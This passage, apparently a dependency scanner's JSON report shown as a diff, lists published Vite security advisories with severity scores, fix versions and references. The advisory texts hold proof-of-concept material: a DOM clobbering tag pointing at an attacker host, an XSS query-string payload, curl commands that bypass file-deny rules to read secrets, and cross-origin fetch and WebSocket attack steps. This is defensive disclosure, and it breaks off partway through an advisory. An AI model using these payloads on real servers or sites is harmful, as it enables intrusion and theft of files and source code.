developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n```\nconst relativeUrlMechanisms = {\n  amd: (relativePath) => {\n    if (relativePath[0] !== \".\") relativePath = \"./\" + relativePath;\n    return getResolveUrl(\n      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`\n    );\n  },\n  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath)})`,\n  es: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`\n  ),\n  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),\n  // NOTE: make sure rollup generate `module` params\n  system: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`\n  ),\n  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath, true)})`\n};\n```\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. \n\n```\n// main.js\nimport extraURL from './extra.js?url'\nvar s = document.createElement('script')\ns.src = extraURL\ndocument.head.append(s)\n```\n\n```\n// extra.js\nexport default \"https://myserver/justAnOther.js\"\n```\n\n```\n// vite.config.js\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n  build: {\n    assetsInlineLimit: 0, // To avoid inline assets for PoC\n    rollupOptions: {\n      output: {\n        format: \"cjs\"\n      },\n    },\n  },\n  base: \"./\",\n});\n```\n\nAfter running the build command, the developer will get following bundle as the output.\n\n```\n// dist/index-DDmIg9VD.js\n\"use strict\";const t=\"\"+(typeof document>\"u\"?require(\"url\").pathToFileURL(__dirname+\"/extra-BLVEx9Lb.js\").href:new URL(\"extra-BLVEx9Lb.js\",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(\"script\");e.src=t;document.head.append(e);\n```\n\nAdding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Vite Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"/assets/index-DDmIg9VD.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.\n\n### Patch\n\n```\n// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n  getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', ${\n      umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,\n  )\n```",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-17T19:28:01Z",
+        "modifiedDate": "2025-07-29T11:27:19.592058Z",
+        "daysSincePublished": 456
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "5.4.6",
+        "recommendation": "Upgrade to 5.4.6 or later",
+        "fixAvailableSince": "2025-07-29T11:27:19.592Z",
+        "daysSinceFix": 141,
+        "monthsSinceFix": 4,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45812"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        },
+        {
+          "type": "WEB",
+          "url": "https://research.securitum.com/xss-in-amp4email-dom-clobbering"
+        },
+        {
+          "type": "WEB",
+          "url": "https://scnps.co/papers/sp23_domclob.pdf"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8jhw-289h-jh2g",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-31207"
+      ],
+      "summary": "Vite's `server.fs.deny` did not deny requests for patterns with directories.",
+      "details": "### Summary\n[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.\n\n### Impact\nOnly apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Patches\nFixed in vite@5.2.6, vite@5.1.7, vite@5.0.13, vite@4.5.3, vite@3.2.10, vite@2.9.18\n\n### Details\n`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.\n\n**Reproduction**\n\nSet fs.deny to `['**/.git/**']` and then curl for `/.git/config`.\n\n* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).\n* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).\n",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-04-03T16:46:17Z",
+        "modifiedDate": "2024-04-05T01:28:39.527659Z",
+        "daysSincePublished": 623
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "2.9.18",
+        "recommendation": "Upgrade to 2.9.18 or later",
+        "fixAvailableSince": "2024-04-05T01:28:39.527Z",
+        "daysSinceFix": 621,
+        "monthsSinceFix": 20,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-31207"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-92r3-m2mg-pj97",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-49293"
+      ],
+      "summary": "Vite XSS vulnerability in `server.transformIndexHtml` via URL payload",
+      "details": "### Summary\nWhen Vite's HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`<script type=\"module\">...</script>`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`.\n\n### Impact\nOnly apps using `appType: 'custom'` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren't exposed to the attacker.\n\n### Patches\nFixed in vite@5.0.5, vite@4.5.1, vite@4.4.12\n\n### Details\nSuppose `index.html` contains an inline module script:\n\n```html\n<script type=\"module\">\n  // Inline script\n</script>\n```\n\nThis script is transformed into a proxy script like\n\n```html\n<script type=\"module\" src=\"/index.html?html-proxy&index=0.js\"></script>\n```\n\ndue to Vite's HTML plugin:\n\nhttps://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/packages/vite/src/node/plugins/html.ts#L429-L465\n\nWhen `appType: 'spa' | 'mpa'`, Vite serves HTML itself, and `htmlFallbackMiddleware` rewrites `req.url` to the canonical path of `index.html`,\n\nhttps://github.com/vitejs/vite/blob/73ef074b80fa7252e0c46a37a2c94ba8cba46504/packages/vite/src/node/server/middlewares/htmlFallback.ts#L44-L47\n\nso the `url` passed to `server.transformIndexHtml` is `/index.html`.\n\nHowever, if `appType: 'custom'`, HTML is served manually, and if `server.transformIndexHtml` is called with the unmodified request URL (as the SSR docs suggest), then the path of the transformed `html-proxy` script varies with the request URL. For example, a request with path `/` produces\n\n```html\n<script type=\"module\" src=\"/@id/__x00__/index.html?html-proxy&index=0.js\"></script>\n```\n\nIt is possible to abuse this behavior by crafting a request URL to contain a malicious payload like\n\n```\n\"></script><script>alert('boom')</script>\n```\n\nso a request to http://localhost:5173/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E produces HTML output like\n\n```html\n<script type=\"module\" src=\"/@id/__x00__/?\"></script><script>alert(\"boom\")</script>?html-proxy&index=0.js\"></script>\n```\n\nwhich demonstrates XSS.\n\n### PoC\n\n- Example 1. Serving HTML from `vite dev` middleware with `appType: 'custom'`\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev-html\n    - \"Open in New Tab\"\n    - Edit URL to set query string to `?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E` and navigate\n    - Witness XSS:\n    - ![image](https://user-images.githubusercontent.com/2456381/287434281-13757894-7a63-4a73-b1e9-d2b024c19d14.png)\n- Example 2. Serving HTML from SSR-style Express server (Vite dev server runs in middleware mode):\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=server\n    - (Same steps as above)\n- Example 3. Plain `vite dev` (this shows that vanilla `vite dev` is _not_ vulnerable, provided `htmlFallbackMiddleware` is used)\n    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev\n    - (Same steps as above)\n    - You should _not_ see the alert box in this case\n\n### Detailed Impact\n\nThis will probably predominantly affect [development-mode SSR](https://vitejs.dev/guide/ssr#setting-up-the-dev-server), where `vite.transformHtml` is called using the original `req.url`, per the docs:\n\nhttps://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/docs/guide/ssr.md?plain=1#L114-L126\n\nHowever, since this vulnerability affects `server.transformIndexHtml`, the scope of impact may be higher to also include other ad-hoc calls to `server.transformIndexHtml` from outside of Vite's own codebase.\n\nMy best guess at bisecting which versions are vulnerable involves the following test script\n\n```js\nimport fs from 'node:fs/promises';\nimport * as vite from 'vite';\n\nconst html = `\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n  </head>\n  <body>\n    <script type=\"module\">\n      // Inline script\n    </script>\n  </body>\n</html>\n`;\nconst server = await vite.createServer({ appType: 'custom' });\nconst transformed = await server.transformIndexHtml('/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E', html);\nconsole.log(transformed);\nawait server.close();\n```\n\nand using it I was able to narrow down to #13581. If this is correct, then vulnerable Vite versions are 4.4.0-beta.2 and higher (which includes 4.4.0).",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-12-05T23:31:34Z",
+        "modifiedDate": "2023-12-06T00:11:36.913866Z",
+        "daysSincePublished": 742
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "4.4.12",
+        "recommendation": "Upgrade to 4.4.12 or later",
+        "fixAvailableSince": "2023-12-06T00:11:36.913Z",
+        "daysSinceFix": 742,
+        "monthsSinceFix": 24,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49293"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9cwx-2883-4wfx",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45811"
+      ],
+      "summary": "Vite's `server.fs.deny` is bypassed when using `?import&raw`",
+      "details": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.\n\n### PoC\n```sh\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```\n\n",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-17T18:44:12Z",
+        "modifiedDate": "2024-09-19T18:34:32Z",
+        "daysSincePublished": 456
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "5.4.6",
+        "recommendation": "Upgrade to 5.4.6 or later",
+        "fixAvailableSince": "2024-09-19T18:34:32.000Z",
+        "daysSinceFix": 454,
+        "monthsSinceFix": 15,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45811"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c24v-8rfc-w8vw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-23331"
+      ],
+      "summary": "Vite dev server option `server.fs.deny` can be bypassed when hosted on case-insensitive filesystem",
+      "details": "### Summary\n[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows.\n\nThis bypass is similar to https://nvd.nist.gov/vuln/detail/CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems.\n\n### Patches\nFixed in vite@5.0.12, vite@4.5.2, vite@3.2.8, vite@2.9.17\n\n### Details\nSince `picomatch` defaults to case-sensitive glob matching, but the file server doesn't discriminate; a blacklist bypass is possible. \n\nSee `picomatch`  usage, where `nocase` is defaulted to `false`: https://github.com/vitejs/vite/blob/v5.1.0-beta.1/packages/vite/src/node/server/index.ts#L632\n\nBy requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. \n\n### PoC\n**Setup**\n1. Created vanilla Vite project using `npm create vite@latest` on a Standard Azure hosted Windows 10 instance. \n    - `npm run dev -- --host 0.0.0.0`\n    - Publicly accessible for the time being here: http://20.12.242.81:5173/ \n2. Created dummy secret files, e.g. `custom.secret` and `production.pem`\n3. Populated `vite.config.js` with\n```javascript\nexport default { server: { fs: { deny: ['.env', '.env.*', '*.{crt,pem}', 'custom.secret'] } } }\n```\n\n**Reproduction**\n1. `curl -s http://20.12.242.81:5173/@fs//`\n    - Descriptive error page reveals absolute filesystem path to project root\n2. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/vite.config.js`\n    - Discoverable configuration file reveals locations of secrets\n3. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/custom.sEcReT`\n    - Secrets are directly accessible using case-augmented version of filename\n\n**Proof**\n![Screenshot 2024-01-19 022736](https://user-images.githubusercontent.com/907968/298020728-3a8d3c06-fcfd-4009-9182-e842f66a6ea5.png)\n\n### Impact\n**Who**\n- Users with exposed dev servers on environments with case-insensitive filesystems\n\n**What**\n- Files protected by `server.fs.deny` are both discoverable, and accessible",
+      "cwes": [
+        {
+          "id": "CWE-178",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-01-19T21:58:47Z",
+        "modifiedDate": "2024-01-19T22:11:32.070917Z",
+        "daysSincePublished": 697
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "2.9.17",
+        "recommendation": "Upgrade to 2.9.17 or later",
+        "fixAvailableSince": "2024-01-19T22:11:32.070Z",
+        "daysSinceFix": 697,
+        "monthsSinceFix": 23,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34092"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23331"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vitejs.dev/config/server-options.html#server-fs-deny"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-vg6x-rcgg-rjx6",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-24010"
+      ],
+      "summary": "Websites were able to send any requests to the development server and read the response in vite",
+      "details": "### Summary\nVite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.\n\n> [!WARNING]\n> This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.\n\n### Upgrade Path\nUsers that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.\n\n- Using the backend integration feature\n- Using a reverse proxy in front of Vite\n- Accessing the development server via a domain other than `localhost` or `*.localhost`\n- Using a plugin / framework that connects to the WebSocket server on their own from the browser\n\n#### Using the backend integration feature\nIf you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.\n\n#### Using a reverse proxy in front of Vite\nIf you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.\n\n#### Accessing the development server via a domain other than `localhost` or `*.localhost`\nYou need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.\n\n#### Using a plugin / framework that connects to the WebSocket server on their own from the browser\nIf you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.\n\nIn that case, you can either:\n\n- fix the plugin / framework code to the make it compatible with the new version of Vite\n- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite\n  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.\n\n### Mitigation without upgrading Vite\n#### [1]: Permissive default CORS settings\nSet `server.cors` to `false` or limit `server.cors.origin` to trusted origins.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nThere aren't any mitigations for this.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUse Chrome 94+ or use HTTPS for the development server.\n\n### Details\n\nThere are three causes that allowed malicious websites to send any requests to the development server:\n\n#### [1]: Permissive default CORS settings\n\nVite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n\nVite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.\n4. The user edits some files.\n5. Vite sends some HMR messages over WebSocket.\n6. The attacker gets the content of the HMR messages.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\n\nUnless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.\n\n1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).\n2. The user accesses the malicious web page.\n3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).\n4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.\n5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.\n\n### Impact\n#### [1]: Permissive default CORS settings\nUsers with the default `server.cors` option may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nAll users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.\n\nFor users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.\n\nFor users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUsers using HTTP for the development server and using a browser that is not Chrome 94+ may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\nChrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.\n\n### Related Information\nSafari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.\n\n### PoC\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n1. I used the `react` template which utilizes HMR functionality.\n\n```\nnpm create vite@latest my-vue-app-react -- --template react\n```\n\n2. Then on a malicious server, serve the following POC 